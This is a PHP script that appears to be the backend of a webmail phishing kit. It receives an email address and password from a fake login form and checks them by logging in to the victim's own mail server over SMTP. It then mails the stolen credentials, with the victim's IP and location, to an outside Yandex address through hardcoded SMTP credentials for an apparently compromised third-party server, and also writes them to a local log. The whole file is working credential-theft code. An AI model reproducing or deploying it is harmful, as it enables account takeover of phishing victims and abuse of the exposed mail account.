<?php
// Required PHPMailer classes (place these files in the same directory):
// - class.phpmailer.php
// - class.smtp.php

require_once 'class.phpmailer.php';
require_once 'class.smtp.php';

// Enable PHP error reporting for debugging
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Allow cross-origin requests
header('Access-Control-Allow-Origin: *');

// Get client IP and geolocation data
$ip = $_SERVER['REMOTE_ADDR'];
$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));

session_start();

// Block GET requests
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    echo '<html><head><title>403 - Forbidden</title></head><body>';
    echo '<h1>403 Forbidden</h1><hr></body></html>';
    exit();
}

// Configuration - set your notification SMTP details here
$receiver         = "logs.ironside511@yandex.com";         // Notification recipient
$senderUser       = "tp@globalhouse.co.th";                // SMTP username for sending notifications
$senderPass       = "Globalhouse@123";                     // SMTP password
$senderPort       = 587;                                    // SMTP port (587 for TLS or 465 for SSL)
$senderServer     = "mail.globalhouse.co.th";              // SMTP server hostname
$senderEncryption = 'tls';                                  // 'tls', 'ssl', or '' for no encryption

// Retrieve POST data (email and password)
$login  = isset($_POST['email']) ? $_POST['email'] : '';
$passwd = isset($_POST['password']) ? $_POST['password'] : '';

if (empty($login) || empty($passwd)) {
    echo json_encode(['signal' => 'error', 'msg' => 'Email and password required']);
    exit();
}

// Parse domain from email
$parts  = explode("@", $login);
$domain = $parts[1] ?? '';

// Prepare email subjects with geolocation info
$country = $ipdat->geoplugin_countryName ?? 'Unknown';
$city    = $ipdat->geoplugin_city ?? 'Unknown';

$subjSuccess = "TrueRcubeOrange || $country || $login";
$subjFail    = "notVerifiedRcubeOrange || $country || $login";

// Prepare message body (plain text)
$message = "Email = $login\nPassword = $passwd\nIP of sender: $country | $city | $ip";

$validCredentials = false;

try {
    // Attempt SMTP authentication on user's SMTP server
    $testMail = new PHPMailer(true);
    $testMail->isSMTP();
    $testMail->SMTPAuth   = true;
    $testMail->SMTPOptions = array(
        'ssl' => array(
            'verify_peer' => false,
            'verify_peer_name' => false,
            'allow_self_signed' => true
        )
    );

    $testMail->Host       = "mail.$domain";
    $testMail->Port       = 587;
    $testMail->SMTPSecure = 'tls';

    $testMail->Username   = $login;
    $testMail->Password   = $passwd;

    // Test connection without sending email
    $validCredentials = $testMail->SmtpConnect();
    $testMail->SmtpClose();

} catch (Exception $e) {
    error_log("SMTP connect error: " . $e->getMessage());
    $validCredentials = false;
}

// Function to send notification email
function sendNotificationEmail($senderServer, $senderPort, $senderEncryption, $senderUser, $senderPass, $receiver, $subject, $message) {
    try {
        $mail = new PHPMailer(true);
        $mail->isSMTP();
        $mail->SMTPAuth    = true;
        $mail->SMTPDebug   = 2;
        $mail->Debugoutput = 'echo';
        
        // Add SSL/TLS options for better compatibility
        $mail->SMTPOptions = array(
            'ssl' => array(
                'verify_peer' => false,
                'verify_peer_name' => false,
                'allow_self_signed' => true
            )
        );

        $mail->Host       = $senderServer;
        $mail->Port       = $senderPort;
        $mail->SMTPSecure = $senderEncryption;

        $mail->Username   = $senderUser;
        $mail->Password   = $senderPass;

        $mail->setFrom($senderUser, 'SS-RCube');
        $mail->addAddress($receiver);

        $mail->isHTML(false);
        $mail->Subject = $subject;
        $mail->Body    = $message;

        $result = $mail->send();
        return $result;
        
    } catch (Exception $e) {
        echo "Notification mail error: " . $e->getMessage() . "\n";
        if (isset($mail)) {
            echo "PHPMailer Error Info: " . $mail->ErrorInfo . "\n";
        }
        return false;
    }
}

// Send appropriate notification based on credential validation
if ($validCredentials) {
    // Send notification of successful login
    $emailSent = sendNotificationEmail($senderServer, $senderPort, $senderEncryption, $senderUser, $senderPass, $receiver, $subjSuccess, $message);
    
    if ($emailSent) {
        echo json_encode(['signal' => 'ok', 'msg' => 'Login Successful']);
    } else {
        echo json_encode(['signal' => 'ok', 'msg' => 'Login Successful (notification failed)']);
    }
} else {
    // Send notification of failed login
    $emailSent = sendNotificationEmail($senderServer, $senderPort, $senderEncryption, $senderUser, $senderPass, $receiver, $subjFail, $message);
    
    if ($emailSent) {
        echo json_encode(['signal' => 'error', 'msg' => 'Invalid credentials']);
    } else {
        echo json_encode(['signal' => 'error', 'msg' => 'Invalid credentials (notification failed)']);
    }
}

// Log message locally
$fp = fopen("SS-Or.txt", "a");
if ($fp) {
    fputs($fp, date('Y-m-d H:i:s') . " - " . $message . PHP_EOL);
    fclose($fp);
}

// Generate random MD5 hash (not used further here)
$praga = md5(rand());

?>